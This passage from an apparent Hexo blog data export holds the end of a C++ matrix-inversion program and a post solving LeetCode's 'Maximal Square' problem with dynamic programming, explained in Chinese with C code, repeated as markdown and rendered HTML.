class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"regexp\">// <span class=\"comment\">###     ###     ###    ####### ###     ###    ###     ### ####### ####### ###   ###   ######   ######  </span></span><br><span class=\"line\">//</span> <span class=\"comment\">####   ####    #####   ####### ####    ###    ####   #### ####### ####### ###   ###  ########  ####### </span></span><br><span class=\"line\"><span class=\"regexp\">// <span class=\"comment\">##### #####    #####     ###   #####   ###    ##### ##### ###       ###   ###   ### ########## ########</span></span><br><span class=\"line\">//</span> <span class=\"comment\">###########   ### ###    ###   ######  ###    ########### #######   ###   ######### ####  #### ###  ###</span></span><br><span class=\"line\"><span class=\"regexp\">// <span class=\"comment\">### ### ###   ### ###    ###   ### ### ###    ### ### ### #######   ###   ######### ###    ### ###  ###</span></span><br><span class=\"line\">//</span> <span class=\"comment\">###  #  ###  ###   ###   ###   ###  ######    ###  #  ### ###       ###   ######### ####  #### ###  ###</span></span><br><span class=\"line\"><span class=\"regexp\">// <span class=\"comment\">###     ###  #########   ###   ###   #####    ###     ### ###       ###   ###   ### ########## ########</span></span><br><span class=\"line\">//</span> <span class=\"comment\">###     ###  ######### ####### ###    ####    ###     ### #######   ###   ###   ###  ########  ######## </span></span><br><span class=\"line\"><span class=\"regexp\">// <span class=\"comment\">###     ###  ###   ### ####### ###     ###    ###     ### #######   ###   ###   ###   ######   ######  </span></span><br><span class=\"line\"></span><br><span class=\"line\">//</span>execution format : [executable name] [argument]</span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int size;</span><br><span class=\"line\">\t<span class=\"regexp\">///usage handling</span><br><span class=\"line\">\tif( argc == 1 )&#123;</span><br><span class=\"line\">\t\tdefaultOutput();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//</span>/file format handling</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>( argc == <span class=\"number\">2</span> &amp;&amp; ( strcmp(argv[<span class=\"number\">1</span>], <span class=\"string\">\"-format\"</span>)==<span class=\"number\">0</span> ) )&#123;</span><br><span class=\"line\">\t\tfileFormat();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"regexp\">///invert</span><br><span class=\"line\">\tif( argc == 2 &amp;&amp; ( strcmp(argv[1], \"-format\")!=0 ) )&#123;</span><br><span class=\"line\">\t\tdouble ** matrix = parseMatrixFile( argv[1], &amp;size );</span><br><span class=\"line\"></span><br><span class=\"line\">        if(strcmp(argv[1],\"-g\") == 0) &#123;</span><br><span class=\"line\">            matrix = generateMatrix(3);</span><br><span class=\"line\">            printf(\"Generate matrix with order 3\\n\");</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t//</span>compute the simple inverse <span class=\"keyword\">and</span> <span class=\"built_in\">print</span> <span class=\"literal\">it</span></span><br><span class=\"line\">\t\tdouble ** simpleInverse = simpleMatrixInversion( matrix,size);</span><br><span class=\"line\">        printf(<span class=\"string\">\"The simple inverse result is:\\n\"</span>);</span><br><span class=\"line\">\t\tprintMatrix(simpleInverse,size);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"regexp\">//compute the inverse with partial pivoting and print it</span><br><span class=\"line\">\t\tdouble ** partialInverse = partialPivotInversion( matrix,size);</span><br><span class=\"line\">        printf(\"The pivot inverse result is:\\n\");</span><br><span class=\"line\">\t\tprintMatrix(partialInverse,size);</span><br><span class=\"line\">        if(compare(simpleInverse,partialInverse,size)) printf(\"Same\\n\");</span><br><span class=\"line\">        else printf(\"Different\\n\");</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t//</span>clean up</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>; i&lt;size; i++)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">delete</span>[](simpleInverse[i]);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">delete</span>[](partialInverse[i]);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">delete</span>[](matrix[i]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">delete</span>[](simpleInverse);</span><br><span class=\"line\">\t\t<span class=\"keyword\">delete</span>[](partialInverse);</span><br><span class=\"line\">\t\t<span class=\"keyword\">delete</span>[](matrix);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(argc == <span class=\"number\">3</span> &amp;&amp; (strcmp(argv[<span class=\"number\">1</span>], <span class=\"string\">\"-g\"</span>) == <span class=\"number\">0</span>))&#123;</span><br><span class=\"line\">        size = atoi(argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(size &lt; <span class=\"number\">2</span>)&#123;</span><br><span class=\"line\">            printf(<span class=\"string\">\"The size of matrix must bigger than 1\\n\"</span>);</span><br><span class=\"line\">            exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        double ** matrix = generateMatrix(size);</span><br><span class=\"line\">        printf(<span class=\"string\">\"Matrix size %dx%d generated\\n\"</span>,size,size);</span><br><span class=\"line\">        printMatrix(matrix,size);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span></span><br></pre></td></tr></table></figure>"},{"title":"Maximal Square","date":"2015-06-07T16:08:25.000Z","_content":"Given a 2D binary matrix filled with 0's and 1's, find the largest square containing all 1's and return its area.\n\nFor example, given the following matrix:\n\n1 0 1 0 0\n1 0 1 1 1\n1 1 1 1 1\n1 0 0 1 0\nReturn 4\n\n<!--more-->\n##本题解法##\n简单的DP。PS:我也不知道有没有别的更好的做法，反正第一反应就是dp，也就dp过了。就这样吧\n我们最终要求的是方块全是1的最大的方块，设计三个dp的部分，分别是表示当前格子的最大方块，当前格子竖直方向连续的1的个数，当前格子水平方向连续1的个数。\n因为限制某个格子左上角最大方块的只有这个点左上角的点有多大，上边的点竖直方向上连续的1的个数够不够扩展，左边的点水平方向上的1的个数够不够扩展，三个要素找一个最小的就是可扩展的边长了。\n这样就可以看到，某个位置dps[i][j] = min(dph[i][j - 1],dpv[i - 1][j],dps[i - 1][j - 1]);\ndph[i][j - 1](当前格子左边的一个格子水平连续1的个数)，dpv[i - 1][j](当前格子上边的一个格子竖直连续1的个数)，dps[i - 1][j - 1]当前格子左上角的最大方块的边长\n##实现代码##\n```\nint min(int a,int b,int c){\n    return (a<((b<c)?b:c)?a:((b<c)?b:c));\n}\nint max(int a,int b){\n    if(a > b) return a;\n    return b;\n}\n#define size 1000\nint dps[size][size];\nint dph[size][size];\nint dpv[size][size];\nint maximalSquare(char** matrix, int matrixRowSize, int matrixColSize) {\n    if(matrixRowSize == 0 || matrixColSize == 0) return 0;\n    int maxnum = 0;\n    int temp;\n    if(matrix[0][0] == '1') temp = 1;\n    else temp = 0;\n    dps[0][0] = temp;\n    dph[0][0] = temp;\n    dpv[0][0] = temp;\n    maxnum = max(maxnum,temp);\n    for(int i = 1;i < matrixColSize;++ i){//初始化水平方向第一行\n        if(matrix[0][i] == '1'){\n            dps[0][i] = 1;\n            dph[0][i] = dph[0][i - 1] + 1;\n            dpv[0][i] = 1;\n        }else{\n            dps[0][i] = dpv[0][i] = 0;\n            dph[0][i] = 0;\n        }\n        maxnum = max(maxnum,dps[0][i]);\n    }\n\n    for(int i = 1;i < matrixRowSize;++ i){//初始化竖直方向第一行\n        if(matrix[i][0] == '1'){\n            dps[i][0] = 1;\n            dph[i][0] = 1;\n            dpv[i][0] = dpv[i - 1][0] + 1;\n        }else{\n            dps[i][0] = 0;\n            dpv[i][0] = dph[i][0] = 0;\n        }\n        maxnum = max(maxnum,dps[i][0]);\n    }\n    for(int i = 1;i < matrixRowSize; ++i){//开始dp的过程\n        for(int j = 1;j < matrixColSize;++ j){\n            if(matrix[i][j] == '1') {//如果这个格子是1，就可以扩展\n                dps[i][j] = min(dps[i - 1][j - 1],dpv[i - 1][j],dph[i][j - 1]) + 1;\n                dph[i][j] = dph[i][j - 1] + 1;\n                dpv[i][j] = dpv[i - 1][j] + 1;\n            }else{//不是1就清零\n                dps[i][j] = 0;\n                dph[i][j] = 0;\n                dpv[i][j] = 0;\n            }\n            maxnum = max(maxnum,dps[i][j]);\n        }\n    }\n    return maxnum * maxnum;\n}\n```","source":"_posts/MaximalSquare.md","raw":"title: \"Maximal Square\"\ndate: 2015-06-07 16:08:25\ntags: leetcode\n---\nGiven a 2D binary matrix filled with 0's and 1's, find the largest square containing all 1's and return its area.\n\nFor example, given the following matrix:\n\n1 0 1 0 0\n1 0 1 1 1\n1 1 1 1 1\n1 0 0 1 0\nReturn 4\n\n<!--more-->\n##本题解法##\n简单的DP。PS:我也不知道有没有别的更好的做法，反正第一反应就是dp，也就dp过了。就这样吧\n我们最终要求的是方块全是1的最大的方块，设计三个dp的部分，分别是表示当前格子的最大方块，当前格子竖直方向连续的1的个数，当前格子水平方向连续1的个数。\n因为限制某个格子左上角最大方块的只有这个点左上角的点有多大，上边的点竖直方向上连续的1的个数够不够扩展，左边的点水平方向上的1的个数够不够扩展，三个要素找一个最小的就是可扩展的边长了。\n这样就可以看到，某个位置dps[i][j] = min(dph[i][j - 1],dpv[i - 1][j],dps[i - 1][j - 1]);\ndph[i][j - 1](当前格子左边的一个格子水平连续1的个数)，dpv[i - 1][j](当前格子上边的一个格子竖直连续1的个数)，dps[i - 1][j - 1]当前格子左上角的最大方块的边长\n##实现代码##\n```\nint min(int a,int b,int c){\n    return (a<((b<c)?b:c)?a:((b<c)?b:c));\n}\nint max(int a,int b){\n    if(a > b) return a;\n    return b;\n}\n#define size 1000\nint dps[size][size];\nint dph[size][size];\nint dpv[size][size];\nint maximalSquare(char** matrix, int matrixRowSize, int matrixColSize) {\n    if(matrixRowSize == 0 || matrixColSize == 0) return 0;\n    int maxnum = 0;\n    int temp;\n    if(matrix[0][0] == '1') temp = 1;\n    else temp = 0;\n    dps[0][0] = temp;\n    dph[0][0] = temp;\n    dpv[0][0] = temp;\n    maxnum = max(maxnum,temp);\n    for(int i = 1;i < matrixColSize;++ i){//初始化水平方向第一行\n        if(matrix[0][i] == '1'){\n            dps[0][i] = 1;\n            dph[0][i] = dph[0][i - 1] + 1;\n            dpv[0][i] = 1;\n        }else{\n            dps[0][i] = dpv[0][i] = 0;\n            dph[0][i] = 0;\n        }\n        maxnum = max(maxnum,dps[0][i]);\n    }\n\n    for(int i = 1;i < matrixRowSize;++ i){//初始化竖直方向第一行\n        if(matrix[i][0] == '1'){\n            dps[i][0] = 1;\n            dph[i][0] = 1;\n            dpv[i][0] = dpv[i - 1][0] + 1;\n        }else{\n            dps[i][0] = 0;\n            dpv[i][0] = dph[i][0] = 0;\n        }\n        maxnum = max(maxnum,dps[i][0]);\n    }\n    for(int i = 1;i < matrixRowSize; ++i){//开始dp的过程\n        for(int j = 1;j < matrixColSize;++ j){\n            if(matrix[i][j] == '1') {//如果这个格子是1，就可以扩展\n                dps[i][j] = min(dps[i - 1][j - 1],dpv[i - 1][j],dph[i][j - 1]) + 1;\n                dph[i][j] = dph[i][j - 1] + 1;\n                dpv[i][j] = dpv[i - 1][j] + 1;\n            }else{//不是1就清零\n                dps[i][j] = 0;\n                dph[i][j] = 0;\n                dpv[i][j] = 0;\n            }\n            maxnum = max(maxnum,dps[i][j]);\n        }\n    }\n    return maxnum * maxnum;\n}\n```","slug":"MaximalSquare","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681uq000xwypd1fktw648","content":"<p>Given a 2D binary matrix filled with 0’s and 1’s, find the largest square containing all 1’s and return its area.</p>\n<p>For example, given the following matrix:</p>\n<p>1 0 1 0 0<br>1 0 1 1 1<br>1 1 1 1 1<br>1 0 0 1 0<br>Return 4</p>\n<a id=\"more\"></a>\n<p>##本题解法##<br>简单的DP。PS:我也不知道有没有别的更好的做法，反正第一反应就是dp，也就dp过了。就这样吧<br>我们最终要求的是方块全是1的最大的方块，设计三个dp的部分，分别是表示当前格子的最大方块，当前格子竖直方向连续的1的个数，当前格子水平方向连续1的个数。<br>因为限制某个格子左上角最大方块的只有这个点左上角的点有多大，上边的点竖直方向上连续的1的个数够不够扩展，左边的点水平方向上的1的个数够不够扩展，三个要素找一个最小的就是可扩展的边长了。<br>这样就可以看到，某个位置dps[i][j] = min(dph[i][j - 1],dpv[i - 1][j],dps[i - 1][j - 1]);<br>dph[i]<a href=\"当前格子左边的一个格子水平连续1的个数\">j - 1</a>，dpv[i - 1]<a href=\"当前格子上边的一个格子竖直连续1的个数\">j</a>，dps[i - 1][j - 1]当前格子左上角的最大方块的边长</p>\n<p>##实现代码##<br><figure class=\"highlight prolog\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int min(int a,int b,int c)&#123;</span><br><span class=\"line\">    return (a&lt;((b&lt;c)?b:c)?a:((b&lt;c)?b:c));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int max(int a,int b)&#123;</span><br><span class=\"line\">    if(a &gt; b) return a;</span><br><span class=\"line\">    return b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#define size <span class=\"number\">1000</span></span><br><span class=\"line\">int dps[size][size];</span><br><span class=\"line\">int dph[size][size];</span><br><span class=\"line\">int dpv[size][size];</span><br><span class=\"line\">int maximalSquare(char** matrix, int matrixRowSize, int matrixColSize) &#123;</span><br><span class=\"line\">    if(matrixRowSize == <span class=\"number\">0</span> || matrixColSize == <span class=\"number\">0</span>) return <span class=\"number\">0</span>;</span><br><span class=\"line\">    int maxnum = <span class=\"number\">0</span>;</span><br><span class=\"line\">    int temp;</span><br><span class=\"line\">    if(matrix[<span class=\"number\">0</span>][<span class=\"number\">0</span>] == <span class=\"string\">'1'</span>) temp = <span class=\"number\">1</span>;</span><br><span class=\"line\">    else temp = <span class=\"number\">0</span>;</span><br><span class=\"line\">    dps[<span class=\"number\">0</span>][<span class=\"number\">0</span>] = temp;</span><br><span class=\"line\">    dph[<span class=\"number\">0</span>][<span class=\"number\">0</span>] = temp;</span><br><span class=\"line\">    dpv[<span class=\"number\">0</span>][<span class=\"number\">0</span>] = temp;</span><br><span class=\"line\">    maxnum = max(maxnum,temp);</span><br><span class=\"line\">    for(int i = <span class=\"number\">1</span>;i &lt; matrixColSize;++ i)&#123;//初始化水平方向第一行</span><br><span class=\"line\">        if(matrix[<span class=\"number\">0</span>][i] == <span class=\"string\">'1'</span>)&#123;</span><br><span class=\"line\">            dps[<span class=\"number\">0</span>][i] = <span class=\"number\">1</span>;</span><br><span class=\"line\">            dph[<span class=\"number\">0</span>][i] = dph[<span class=\"number\">0</span>][i - <span class=\"number\">1</span>] + <span class=\"number\">1</span>;</span><br><span class=\"line\">            dpv[<span class=\"number\">0</span>][i] = <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            dps[<span class=\"number\">0</span>][i] = dpv[<span class=\"number\">0</span>][i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            dph[<span class=\"number\">0</span>][i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        maxnum = max(maxnum,dps[<span class=\"number\">0</span>][i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    for(int i = <span class=\"number\">1</span>;i &lt; matrixRowSize;++ i)&#123;//初始化竖直方向第一行</span><br><span class=\"line\">        if(matrix[i][<span class=\"number\">0</span>] == <span class=\"string\">'1'</span>)&#123;</span><br><span class=\"line\">            dps[i][<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">            dph[i][<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">            dpv[i][<span class=\"number\">0</span>] = dpv[i - <span class=\"number\">1</span>][<span class=\"number\">0</span>] + <span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            dps[i][<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            dpv[i][<span class=\"number\">0</span>] = dph[i][<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        maxnum = max(maxnum,dps[i][<span class=\"number\">0</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    for(int i = <span class=\"number\">1</span>;i &lt; matrixRowSize; ++i)&#123;//开始dp的过程</span><br><span class=\"line\">        for(int j = <span class=\"number\">1</span>;j &lt; matrixColSize;++ j)&#123;</span><br><span class=\"line\">            if(matrix[i][j] == <span class=\"string\">'1'</span>) &#123;//如果这个格子是<span class=\"number\">1</span>，就可以扩展</span><br><span class=\"line\">                dps[i][j] = min(dps[i - <span class=\"number\">1</span>][j - <span class=\"number\">1</span>],dpv[i - <span class=\"number\">1</span>][j],dph[i][j - <span class=\"number\">1</span>]) + <span class=\"number\">1</span>;</span><br><span class=\"line\">                dph[i][j] = dph[i][j - <span class=\"number\">1</span>] + <span class=\"number\">1</span>;</span><br><span class=\"line\">                dpv[i][j] = dpv[i - <span class=\"number\">1</span>][j] + <span class=\"number\">1</span>;</span><br><span class=\"line\">            &#125;else&#123;//不是<span class=\"number\">1</span>就清零</span><br><span class=\"line\">                dps[i][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                dph[i][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                dpv[i][j] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            maxnum = max(maxnum,dps[i][j]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return maxnum * maxnum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>Given a 2D binary matrix filled with 0’s and 1’s, find the largest square containing all 1’s and return its area.</p>\n<p>For example, given the following matrix:</p>\n<p>1 0 1 0 0<br>1 0 1 1 1<br>1 1 1 1 1<br>1 0 0 1 0<br>Return 4</p>","more":"<p>##本题解法##<br>简单的DP。PS:我也不知道有没有别的更好的做法，反正第一反应就是dp，也就dp过了。就这样吧<br>我们最终要求的是方块全是1的最大的方块，设计三个dp的部分，分别是表示当前格子的最大方块，当前格子竖直方向连续的1的个数，当前格子水平方向连续1的个数。<br>因为限制某个格子左上角最大方块的只有这个点左上角的点有多大，上边的点竖直方向上连续的1的个数够不够扩展，左边的点水平方向上的1的个数够不够扩展，三个要素找一个最小的就是可扩展的边长了。<br>这样就可以看到，某个位置dps[i][j] = min(dph[i][j - 1],dpv[i - 1][j],dps[i - 1][j - 1]);<br>dph[i]<a href=\"当前格子左边的一个格子水平连续1的个数\">j - 1</a>，dpv[i - 1]<a href=\"当前格子上边的一个格子竖直连续1的个数\">j</a>，dps[i - 1][j - 1]当前格子左上角的最大方块的边长</p>\n<p>##实现代码##<br><figure class=\"highlight prolog\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span 